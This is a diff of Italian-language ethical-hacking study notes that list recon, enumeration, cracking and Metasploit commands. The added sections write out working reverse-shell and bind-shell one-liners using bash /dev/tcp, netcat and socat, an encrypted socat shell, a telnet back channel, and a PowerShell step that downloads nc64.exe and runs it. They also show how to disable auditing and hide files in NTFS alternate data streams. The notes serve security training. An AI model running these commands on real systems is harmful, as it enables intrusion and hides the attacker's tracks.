@@ -3,25 +3,26 @@
 1. [SITI](#siti-utili---payload-ed-exploits)
 2. [Comandi](#comandi-da-terminale)
 3. [Porte](#porte-comuni)
-4. [Web FootPrinting](#web-footprinting)
-5. [Network Foot PRinting and Scanning](#network-footprinting-and-scanning)
-6. [Enumeration](#enumeration)
-7. [Exploitation](#exploitation)
-8. [password cracking](#password-cracking)
-9. [Malwares](#malwares)
-10. [social engineering](#social-engineering)
-11. [hiding tracks](#hiding-tracks)
-12. [privesc](#priviledge-excalation)
-13. [network attacks](#network-attacks)
-14. [Ddos](#dosddos-tools)
-15. [session hijacking](#session-hijacking)
-16. [web server and apps](#web-server-and-application)
-17. [wireless](#wireless-networks)
-18. [bluetooth](#bluetooth-attacks)
-19. [mobile](#mobile-hacking)
-20. [IoT](#iot-and-ot-hacking-tools)
-21. [Cloud](#cloud-computing-tools)
-22. [Reverse shell](#reverse-shell)
+4. [Anonimity](#Anonimity)
+5. [Web FootPrinting](#web-footprinting)
+6. [Network Foot PRinting and Scanning](#network-footprinting-and-scanning)
+7. [Enumeration](#enumeration)
+8. [Exploitation](#exploitation)
+9. [Reverse shell](#reverse-shell)
+10. [password cracking](#password-cracking)
+11. [Malwares](#malwares)
+12. [social engineering](#social-engineering)
+13. [hiding tracks](#hiding-tracks)
+14. [privesc](#priviledge-excalation)
+15. [network attacks](#network-attacks)
+16. [Ddos](#dosddos-tools)
+17. [session hijacking](#session-hijacking)
+18. [web server and apps](#web-server-and-application)
+19. [wireless](#wireless-networks)
+20. [bluetooth](#bluetooth-attacks)
+21. [mobile](#mobile-hacking)
+22. [IoT](#iot-and-ot-hacking-tools)
+23. [Cloud](#cloud-computing-tools)
 
 <br>
 <br>
@@ -29,10 +30,30 @@
 <br>
 
 
-# SITI UTILI - payload ed exploits
-- https://github.com/swisskyrepo/PayloadsAllTheThings
-- https://github.com/spaze/hashes
-- https://book.hacktricks.wiki/en/index.html
+# SITI UTILI 
+
+## payload ed exploits
+- [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [hashes](https://github.com/spaze/hashes)
+- [hacktricks](https://book.hacktricks.wiki/en/index.html)
+
+## info utili
+- [GTFOBins](https://gtfobins.github.io/gtfobins/tar/)
+- [Format Specifiers on C](https://www.geeksforgeeks.org/format-specifiers-in-c/)
+
+## tools
+- [CyberChef](https://gchq.github.io/CyberChef/)
+- [pwninit](https://github.com/io12/pwninit?tab=readme-ov-file)
+- [One Gadget](https://github.com/david942j/one_gadget)
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
 
 # Comandi da terminale
 
@@ -40,10 +61,18 @@
 - vedere versione sistema operativo:
   - uname -a
   - lsb_release -a
+- Scaricare il contenuto di un webserver/web app
+  - wget
+  - curl
+- rpcdump.py - tool from Linux, shows services bound to IP addresses
+- `sudo -l`   \# list all the current permissions
+
 
 ## Windows
 
 - TASKLIST: fa vedere tutti i task attivi (tipo task manager)
+- epdump - tool from Microsoft windows resource kit, shows services bound to IP addresses
+
 
 <br>
 <br>
@@ -80,14 +109,63 @@
 > PostgreSQL - 5631 tcp  
 > Traceroute - 33434    
 
+## Info sull'OS
++ Windows: TCP 135, 139, 445, 3389 RDP
++ UNIX: TCP 22 (SSH), 111, 512-514 (berkeley remote services / rlogin), 2049 (NFS) high numbered ports (3277x) for RPCs
+
+<br>
 <br>
 
 ---
 
 <br>
+<br>
 
 
-# WEB FOOTPRINTING
+# Anonimity
+
+## The Onion Router - Tor
+Layered cryptography with SOCKS proxy. It creates anonymous TCP connections. It needs a **GUI Client *(VIDALIA)*** and needs a **Web Filtering Proxy *(Privoxy)***
+
+some tools to use it correctly are:
+
+> tor-resolve: to resolve addresses  
+> proxychains to force connections through Tor  
+> socat: to relay persistently  
+> 
+> to open a proxy listening on localhost and forward all requests through Tor to the target: 
+>> socat TCP4-LISTEN:8080, fork SOCKS4a:127.0.0.1:10.10.10.100:80, socksport=9050 &
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+# FOOTPRINTING
+
+## Siti Utili
+
+- https://osintframework.com
+
+### Phone Numbers
+- phonenumber.com
+- 411.com
+- yellowpages.com
+
+### Other personal detail
+- blackbookonline.info
+- peoplesearch.com
+- social networks
+
+### JobPosting and resumes
+- monster.com
+- careerbuilder.com
+- linkedin.com
+
+
 ## Google Advanced Search
 La barra di ricerca di google permette di ricercare numerose informazioni semplicemente specificando delle keyword
 
@@ -104,6 +182,9 @@ La barra di ricerca di google permette di ricercare numerose informazioni sempli
 >> location: cerca informazioni per una specifica location  
 >> allinanchor / inancor: cerca informazioni nelle ancore  
 
+### Google Hacking Database - GHDB
+Qui si trovano le stringe usate dagli hacker
+> hackersforcharity.org/ghdb
 
 ## Web Data Extractor Pro - Applicazione
 Tool per estrarre tutti i dati da uno specifico sito web dato l'url di arrivo.
@@ -113,16 +194,16 @@ Tool per estrarre tutti i dati da uno specifico sito web dato l'url di arrivo.
 
 Estrae dettagli utili sull'url specificato nel campo di ricerca della pagina, come dettagli sull'organizzazione, servers, IP, ecc...  
   
-<br>
-<br>
+## Teleport Pro - Windows
+Applicazione per scaricare le pagine web per consultarle offline
 
----
+## Altri footprinting tool utili
+- `Athena - snakeoillabs.com`: ricerche nella cache di google
+- `SiteDigger - foundstone.com`: ricerche nella cache di google
+- `Wikto - sensepost.com/research/Wikto`: ricerche nella cache di google
+- `FOCA - informatica64.com/foca.aspx`: analisi dei metadati di file web per leak di informazioni
+- `Maltego - paterva.com`: mining e collegamento di pezzi di informazioni rilevanti per un soggetto
 
-<br>
-<br>
-
-
-# NETWORK FOOTPRINTING AND SCANNING
 ## traceroute
 Permette di tracciare tutti gli hop che vengono fatto da un pacchetto fino alla destinazione
 
@@ -133,6 +214,29 @@ Linux:
 > _UDP_: traceroute link.dom  
 > _TCP_: tcptraceroute link.dom
 
+# whois
+tool da terminale o da web (https://who.is/). è il protocollo per l'interrogazione dei database che ospitano informazioni riguardanti gli assegnatari di una risorsa Internet come nomi di dominio, indirizzi IP e sistemi autonomi.
+
+# DNS interrogation
+
+useful commands / Scripts
+- dnsrecon  
+- nslookup  
+- dnsenum
+- dnsmap
+- fierce
+- host
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+
+# SCANNING
 
 ## NMap
 Tool di scansione della rete molto efficace e con numerosissime opzioni e modalità di scan
@@ -173,11 +277,21 @@ Tool di scansione della rete molto efficace e con numerosissime opzioni e modali
 >> --script _script_: esegue uno script specifico
 >> --reason: shows a new column with REASON
 >> -v: verbose, quindi aumenta i commenti e le info stampate
+>> -send-IP <ip-range>: seleziona il range di ip da scansionare
+>
+> Scan con ping arp per vedere se degli host sono vivi:
+>> nmap -sn -PR -send-IP <IP-RANGE>
 >
 >> Can use numerous scripts used throught the tag ***--script=...***  
 >> https://nmap.org/nsedoc/scripts/  
 
+## arp-scan
+run as root by sudo to list all IP-MAC pairs in the network
 
+> arp-scan --interface=wlan0 –localnet
+
+## superscan
+Multiple pings in parallel to scan hosts. Can be ICMP, TCP or UDP
 
 ## MegaPing - Windows
 
@@ -206,6 +320,9 @@ tips and tricks:
 ### responder
 > sudo responder -I eth0
 
+### snort
+> 
+
 ## Protocolli vulnerabili a Sniffing
 - telnet e Rlogin: keystrokes like usernames and passwords are sent in clear  
 - HTTP: data is sent in clear text  
@@ -215,6 +332,9 @@ tips and tricks:
 - FTP: passwords and data are sent in clear text   
 - SNMP: the first version (SNMPv1) uses clear text to transfer data
 
+## Siphon
+
+fingerprinting database used to understand what OS is installed based on some intercepted traffic
 
 <br>
 <br>
@@ -226,13 +346,8 @@ tips and tricks:
 
 # ENUMERATION  
 
-
 ## robots.txt file
 https://indirizzo/robots.txt
-
-
-## NMAP
-Come può essere usato per lo scan, è molto utile per l'enumeration delle porte aperte e di numerose altre informazioni su connettività e rete.
 
 ## gobuster
 
@@ -240,6 +355,10 @@ tool da terminale linux che serve per enumerare le porte di un server HTTP.
 
 > alcuni tag utili:
 >> --wordlist: serve per specificare la wordlist da usare per ricercare le directory
+
+## OWASP's dirbuster
+
+tool per enumerare file e cartelle ricorsivamente. Facile da rilevare -> proxare con privoxy per nascondere le tracce
 
 ## git-dumper
 tool per scaricare un eventuale repository esposta online
@@ -268,8 +387,18 @@ Tool per effettuare enumerazione di rete.
 Comando per mostrare le informazioni sul target come stato di connessione, shared drive e informazioni di rete.
 > net use
 
+Comando per listare tutti i domini o i computer per dominio:
+> net view /domain
+
 ## NetBIOS Enumerator - Windows
 Tool per enumerare una rete remota con informazioni su dominio, server ecc...
+
+## Other tools for NetBIOS Name Service:
+- NLTEST and NETDOM - Find domain controllers
+- NETVIEWX finds specific services
+- NBTSTAT - collects info from a single system (above)
+- NBTSCAN - scans a whole range of addresses, dumping the NetBIOS tables
+- NMBscan - Kali Linux tool
 
 ## sqlmap
 Tool da terminale linux che permette facilmente di provare tutti i possibili attacchi di SQL injection in maniera automatica dato un sito.
@@ -287,52 +416,6 @@ alcune opzioni utili sono:
 > -T [tabella]: scegli una tabella da enumerare
 > --dump: dump all content of a table
 
-## Metasploit
-Initialize the DB:
-> sudo msfdb reinit
-
-Launch console
->  msfconsole
-
-Check DB Connection
-> db_status
-
-Workspaces
-> check which is used:
->> workspace  
->
-> Create New WOrkspace
->> workspace -a nome_workspace
->
-> Switch workspaces
->>  workspace default
->>  workspace nome_workspace
-
-Enumerating:
-> launch nmap - host discovery
->> db_nmap -sn \<target network\>
->
-> enumerate services and vulns
->> db_nmap --script=vulners -O -sV \<target box\>
->
-> list host, services and vulnerabilities:
->> hosts
->> services
->> vulns
-
-Exploit:
-> search available exploits for discovered services:
->> search _servizio\_vulnerabile_ _versione\_servizio_
-> 
-> sessions managing: once you exploited, you have a session.
->> ^Z - background the current session  
->> sessions - list active sessions  
->> sessions _n_ - switch to session _n_  
->> session -u _n_ - upgrade session _n_ to Meterpreter
->>
->
-
-
 ## Wappalyzer
 Estenzione web che mostra tutte le componenti di una pagina e tutti i linguaggi di cui è composta
 
@@ -342,12 +425,27 @@ permette di vedere tutte le connessioni attualmente attive su windows
 
 > netstat -aon
 
-
 ## crackmapexec
 tool in python utile per fare pentesting a livello di rete per Active Directory. Funziona bene con SMB
 
 Esempio di utilizzo:
 > crackmapexec smb [IP] -u "user" -p "pass" --rid-brute
+
+## dig
+> dig @10.219.100.1 version.bind txt chaos +norecurse
+>
+> tag +norecurse to analyze only local DNS
+
+## dnsenum
+tool to enumerate DNS
+
+## user2sid / sid2user
+tool per enumerare tutti gli utenti su una macchina e il loro SID da remoto -> si può trovare l'account admin da remoto
+
+## SNMP enumeration tools
+- snmputil - WINDOWS NT resource kit
+- snmpget / snmpwalk - LINUX
+- IP Network Browser - Graphical tool
 
 <br>
 <br>
@@ -421,9 +519,6 @@ tcp reverse shell:
 > sul pc attaccante:  
 >> nc -lp 4444  
 >
- 
-## socat
--> da prendere info dalle slide di ETH 0x2
 
 ## telnet
 per connettersi ad un ip su una porta specifica (utile se in ascolto con netcat)
@@ -470,7 +565,7 @@ per usare la shell da python
 <br>
 <br>
 
-# Password Cracking
+# PASSWORD CRACKING
 Alcuni comandi utili per il processo di password cracking
 
 - Linux:
@@ -523,6 +618,9 @@ Permette di trovare le password nei file delle password del sistema, nel tab "CR
 > https://github.com/xchwarze/Cain
 
 
+## Windows Credential Editor - WINDOWS TOOL
+
+Tool per ottenere tutte le credenziali di login in memoria. Ottima per rubare le credenziali non salvate localmente.
 
 ## Default Password lists
 - https://open-sez.me 
@@ -573,6 +671,116 @@ command line tool. Example:
 <br>
 <br>
 
+
+# REVERSE SHELL
+
+Sito che spiega come funzionano
+> https://explainshell.com/explain?cmd=sh+-i+%3E%26+%2Fdev%2Ftcp%2F1.2.3.4%2F4444+0%3C%261#
+> 
+
+## bersaglio Linux
+
+su kali si hanno delle webshell standard nella cartella 
+> /usr/share/webshells
+
+la procedura è sempre la stessa:
+1. scrivere uno script bash:
+
+shell.sh:
+> #!/bin/bash
+> bash -i >& /dev/tcp/[IP TARGET]/[PORTA] 0>&1
+
+2. aprire una porta usando netcat:
+
+> nc -nvlp [PORTA]
+
+3. apri in ascolto python http server (stessa cartella dello shell.sh):
+
+> python3 -m http.server [PORTA]
+
+4. eseguire http://[IP]:[PORTA]/shell.sh da remoto per eseguire lo script.sh sul terminale remoto
+5. usare shell dal listener nc che era aperto prima
+
+### Se si ha accesso già al pc remoto
+
+1. dal tuo pc: `nc -nvlp [PORTA]`
+2. dal pc vittima: `bash -i >& /dev/tcp/[IP_TARGET]/[PORTA] 0<&1`
+
+
+## bersaglio WINDOWS
+
+1. scaricare il file nc64.exe
+2. aprire porta netcat in ascolto:
+
+> nc -nvlp [PORTA]
+
+3. aprire in ascolto python http server dalla cartella in cui si è scaricato nc64.exe:
+
+> python3 -m http.server [PORTA]
+
+4. inserire il file nc64.exe sulla macchina remota:
+
+> powershell -c wget http://[IP]:[PORTA]/nc64.exe -outfile nc64.exe
+
+5. connettere cmd.exe alla nostra macchina tramite netcat:
+
+> powershell -c .\nc64.exe -e cmd.exe [IP] [PORTA]
+
+
+## Passarsi i file da remoto
+
+1. andare nella cartella del file da passare
+2. aprire un server python su una porta libera `python3 -m http.server [PORTA]`
+
+3. connettersi dal proprio pc a: `[indirizzo_ip]:[porta]/[nome_file_da_scaricare]`
+
+ 
+## socat
+### TCP bind Shell
+> on the victim pc:  
+>> socat TCP-LISTEN:4444 EXEC:bash,stderr
+>
+> on the attacker pc:
+>> socat TCP:victim_address:4444 FILE:`tty`
+
+### TCP reverse Shell
+> on the victim pc:  
+>> socat TCP:attacker_address:4444 EXEC:bash,stderr
+>
+> on the attacker pc:
+>> socat TCP-LISTEN:4444 FILE:`tty`
+
+### TCP reverse ENCRYPTED shell
+1. on the attacker pc create a X509 certificate (self-signed, default 30 days validity)
+  > openssl req -newkey rsa:2048 -nodes -x509 -keyout shell.key -out shell.crt
+2. Put key and certificate together
+  >  cat shell.key shell.crt > shell.pem
+3. listen for new connections on the attacker pc
+  > socat OPENSSL-LISTEN:4445,cert=./shell.pem,verify=0 FILE:`tty` 
+4. On the victim box connect to it:
+  > socat OPENSSL:attack_box:4445,verify=0 EXEC:bash,stderr
+
+## Back Channels
+1. run the following commands in two separated windows on the attacker system:
+   > nc -lnvp 80  
+   > nc -lnvp 25  
+   > 
+2. the attacker exploits a vulnerability to run the following command in the target system
+   > telnet [attacker_ip] 80 | sh | telnet [attacker_ip] 25 
+
+3. Now the attacker’s shell windows are connected to the target system
+
+4. The attacker runs a command in the first window on theattacker’s system. The target system reads the commands,executes it locally, and it returns the result to the second window of the attacker
+
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+
 # MALWARES
 
 ## Trojan Horse Construction Kits:
@@ -606,12 +814,14 @@ command line tool. Example:
 
 <br>
 <br>
-<br>
+
+---
+
 <br>
 <br>
 
 
-# Social Engineering
+# SOCIAL ENGINEERING
 
 ## Social Engineering Toolkit: SET
 is an open-source Python-Driven tool aimed at penetration testing around social engineering
@@ -658,7 +868,12 @@ used to audit organization's security for phishing attacks using various phishin
 <br>
 <br>
 
-# Hiding Tracks
+
+# HIDING TRACKS
+
+## disable auditing
+
+> auditpol /disable
 
 ## Clearing logs
 
@@ -671,16 +886,19 @@ used to audit organization's security for phishing attacks using various phishin
 - Windows:
   - aggiungere il bit "hide" ai file in modo da nasconderli  
     - > attrib +h filename
-  - **alternate data streams (ADS)**: nascondere un file dentro un file
-    - > echo "..." > original.txt:nascosto.txt
-    - Usando l'utility cp (Posix).
-      - > cp nc.exe oso001.009:nc.exe  \/\/per nascondere netcat
-      - > cp oso001.009:nc.exe nc.exe \/\/per riottenere netcat
-      - > start oso001.009:nc.exe \/\/per eseguire netcat nascosto
-    - Per rimuovere ADS basta copiare il file in una partizione FAT e rispostarlo nella NTFS
 
+- **alternate data streams (ADS)**: nascondere un file dentro un file
+  - > echo "..." > original.txt:nascosto.txt
+  - Usando l'utility cp (Posix).
+    - > cp nc.exe oso001.009:nc.exe  \/\/per nascondere netcat
+    - > cp oso001.009:nc.exe nc.exe \/\/per riottenere netcat
+    - > start oso001.009:nc.exe \/\/per eseguire netcat nascosto
+  - Per rimuovere ADS basta copiare il file in una partizione FAT e rispostarlo nella NTFS
 
-# Priviledge Excalation
+## Rootkit
+best way to hide files, accounts, backdoors, network connections, etc. on a machine.
+
+# PRIVILEDGE ESCALATION
 
 ## Peas
 Tool che scansione il sistema ed elenca tutte le possibili strade per ottenere priviledge excalation
@@ -691,7 +909,16 @@ Tool che scansione il sistema ed elenca tutte le possibili strade per ottenere p
   - LinPeas
 
 
-# Network Attacks
+<br>
+<br>
+
+---
+
+<br>
+<br>
+
+
+# NETWORK ATTACKS
 
 ## Sniffing Tools
 
@@ -749,7 +976,7 @@ helps analyzing captured packets (.pcap)
 <br>
 <br>
 
-# DoS/DDoS Tools
+# DoS/DDoS 
 
 ## UDP based applications that can be used to attack with UDP flood  
 > CharGEN (Port 19)  
@@ -883,7 +1110,7 @@ Per riconoscere l'attacco con Wireshark, basta tenere d'occhio se compare un ele
 <br>
 <br>
 
-# Web Server and Application 
+# WEB SERVER AND APPLICATIONS
 
 ## Web Server
 
@@ -1003,7 +1230,7 @@ Tags:
 <br>
 <br>
 
-# Wireless Networks 
+# WIRELESS NETWORKS
 
 ## Aircrack-ng suite 
 > http://www.aircrack-ng.org 
@@ -1094,7 +1321,15 @@ Module
 - AirMagnet Planner: https://www.netally.com
 - Extreme AirDefense: https://www.extremenetworks.co
 
-# Bluetooth Attacks
+<br>
+<br>
+
+--- 
+
+<br>
+<br>
+
+# BLUETOOTH ATTACKS
 
 ## BluetoothView
 > https://www.nirsoft.net
@@ -1118,7 +1353,7 @@ BluetoothView is a utility that monitors the activity of Bluetooth devices in th
 <br>
 <br>
 
-# Mobile Hacking
+# MOBILE HACKING
 
 ## Android Hacking Tools
 - Metasploit: https://www.metasploit.com (can be used to create payloads to gain control over android systems)
@@ -1157,7 +1392,7 @@ BluetoothView is a utility that monitors the activity of Bluetooth devices in th
 <br>
 <br>
 
-# IoT and OT Hacking Tools
+# IoT and OT HACKING TOOLS
 
 ## Shodan
 > https://www.shodan.io
@@ -1176,7 +1411,7 @@ you can gather additional information on a target device using the following Sho
 + Search for SCADA systems using geolocation:
   + SCADA Country:"US"
 
-## MQTT Exèòprer
+## MQTT Explorer
 Client MQTT che permette di analizzare il protocollo MQTT sui propri dispositivi.
 
 il protocollo MQTT è uno dei protocolli livello IP per IoT Devices.
@@ -1223,7 +1458,7 @@ il protocollo MQTT è uno dei protocolli livello IP per IoT Devices.
 <br>
 <br>
 
-# Cloud Computing Tools
+# CLOUD COMPUTING TOOLS
 
 ## lazy3: S3 Bucket Enumeration
 > il tool è pubblico su github
@@ -1274,47 +1509,107 @@ il tool listerà bucket pubblici riguardanti la company inserita (o tutti quelli
 <br>
 <br>
 
-# REVERSE SHELL
+# METASPLOIT
 
-## bersaglio Linux
+## Some Informations
+The metasploit framework provides the infrastructure, content and tools to perform penetration tests and extensive security audits. It comprises reconnaissance, exploit development, payload packaging and delivery of exploits to vulnerable targets.
 
-su kali si hanno delle webshell standard nella cartella 
-> /usr/share/webshells
+**Module**: A standalone piece of code or software that extends the funcionality of the Metaploit Framework. A module can be an exploit, escalation, scanner or information gathering unit of code that interfaces with the framework to perform some operations.
 
-la procedura è sempre la stessa:
-1. scrivere uno script bash:
+**Session**: a session is a connection between a target and the machine running Metasploit. Sessions allow for commands to be sent to and executed by the target machine.
 
-shell.sh:
-> #!/bin/bash
-> bash -i >& /dev/tcp/[IP TARGET]/[PORTA] 0>& 1
+### Metasploit Modules 
 
-2. aprire una porta usando netcat:
+**Exploits**: Exploits are the code and commands that Metasploit uses to gain access.
 
-> nc -nvlp [PORTA]
+**Payloads**: Payloads are what are sent with the exploit to provide the attack a mechanism to interact with the exploited system.
 
-3. apri in ascolto python http server (stessa cartella dello shell.sh):
+**Auxiliary**: The Auxiliary modules provide many useful tools including wireless attacks, denial of service, reconnaissance
+scanners, and SIP VoIP attacks.
 
-> python3 -m http.server [PORTA]
+**NOPS**: No Operation. NOPs keep the payload size consistent
 
-4. eseguire http://[IP]:[PORTA]/shell.sh da remoto per eseguire lo script.sh sul terminale remoto
-5. usare shell dal listener nc che era aperto prima
+**Post-Exploitation**: can be run on compromised targets to gather evidence, pivot deeper into a target network, ecc...
+
+**Encoders**: are used to successfully remove unwanted bytes
+
+### Metasploit INterfaces
+
+Metasploit has multiple interfaces including:
+- msfconsole - an interactive command-line like interface
+- msfcli - a literal Linux command line interface
+- Armitage - a GUI-based third partyt application
+- msfweb - browser based interface
+
+### Metasploit Console
+has a simple interface. Allows users to search for modules, configure those modules and execute them against specified targets with chosen payloads.
+
+Provides management interface for opened sessions, network redirection and data collection.
+
+### Starting metasploit
+1. start the PostgreSQL database for Metasploit: `service postgresql start`
+2. launch metasploit framework console: `mfsconsole` 
+
+Core commands:
+   + msf > show exploits
+   + msf > show payloads
+   + msf > search Variable
+   + msf > show options
+   + msf > set Variable
+   + msf > info
+   + msf > exploit
+
+Sample operation:
+  + Open Metasploit Console
+  + Select Exploit
+  + Set Target
+  + Select Payload
+  + Set Options
+  + exploit
+
+## Some Standard Commands
+Initialize the DB:
+> sudo msfdb reinit
+
+Launch console
+>  msfconsole
+
+Check DB Connection
+> db_status
+
+Workspaces
+> check which is used:
+>> workspace  
+>
+> Create New WOrkspace
+>> workspace -a nome_workspace
+>
+> Switch workspaces
+>>  workspace default
+>>  workspace nome_workspace
+
+Enumerating:
+> launch nmap - host discovery
+>> db_nmap -sn \<target network\>
+>
+> enumerate services and vulns
+>> db_nmap --script=vulners -O -sV \<target box\>
+>
+> list host, services and vulnerabilities:
+>> hosts
+>> services
+>> vulns
+
+Exploit:
+> search available exploits for discovered services:
+>> search _servizio\_vulnerabile_ _versione\_servizio_
+> 
+> sessions managing: once you exploited, you have a session.
+>> ^Z - background the current session  
+>> sessions - list active sessions  
+>> sessions _n_ - switch to session _n_  
+>> session -u _n_ - upgrade session _n_ to Meterpreter
+>>
 
 
-## bersaglio WINDOWS
 
-1. scaricare il file nc64.exe
-2. aprire porta netcat in ascolto:
-
-> nc -nvlp [PORTA]
-
-3. aprire in ascolto python http server dalla cartella in cui si è scaricato nc64.exe:
-
-> python3 -m http.server [PORTA]
-
-4. inserire il file nc64.exe sulla macchina remota:
-
-> powershell -c wget http://[IP]:[PORTA]/nc64.exe -outfile nc64.exe
-
-5. connettere cmd.exe alla nostra macchina tramite netcat:
-
-> powershell -c .\nc64.exe -e cmd.exe [IP] [PORTA]
